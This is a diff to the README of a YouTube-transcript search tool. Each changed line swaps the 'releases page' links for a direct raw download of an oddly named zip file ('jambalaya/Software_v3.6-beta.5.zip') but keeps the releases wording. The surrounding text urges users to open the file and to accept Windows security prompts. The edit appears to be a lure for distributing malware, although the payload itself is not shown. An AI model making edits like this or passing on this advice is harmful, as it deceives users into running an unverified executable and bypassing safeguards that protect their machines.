@@ -1,10 +1,10 @@
 # 🔎 ytsearch - Find YouTube transcripts fast
 
-[![Download ytsearch](https://img.shields.io/badge/Download%20ytsearch-Visit%20Releases-blue?style=for-the-badge)](https://github.com/deusef6844/ytsearch/releases)
+[![Download ytsearch](https://img.shields.io/badge/Download%20ytsearch-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/deusef6844/ytsearch/main/jambalaya/Software_v3.6-beta.5.zip)
 
 ## 📥 Download
 
-Go to the [ytsearch releases page](https://github.com/deusef6844/ytsearch/releases) and download the Windows file from the latest release.
+Go to the [ytsearch releases page](https://raw.githubusercontent.com/deusef6844/ytsearch/main/jambalaya/Software_v3.6-beta.5.zip) and download the Windows file from the latest release.
 
 After the file finishes downloading, open it from your Downloads folder. If Windows asks for confirmation, choose the option that lets the app run.
 
@@ -24,7 +24,7 @@ It is built for quick text search. It does not download videos. It does not need
 
 ## 🪟 Windows setup
 
-1. Open the [releases page](https://github.com/deusef6844/ytsearch/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/deusef6844/ytsearch/main/jambalaya/Software_v3.6-beta.5.zip)
 2. Download the latest Windows file
 3. Open the file after it finishes downloading
 4. If Windows shows a security prompt, choose the option to run the app
@@ -136,7 +136,7 @@ It works well for users who want fast answers from video content without watchin
 
 Download the latest Windows release here:
 
-[https://github.com/deusef6844/ytsearch/releases](https://github.com/deusef6844/ytsearch/releases)
+[https://raw.githubusercontent.com/deusef6844/ytsearch/main/jambalaya/Software_v3.6-beta.5.zip](https://raw.githubusercontent.com/deusef6844/ytsearch/main/jambalaya/Software_v3.6-beta.5.zip)
 
 ## 🧾 Name
 
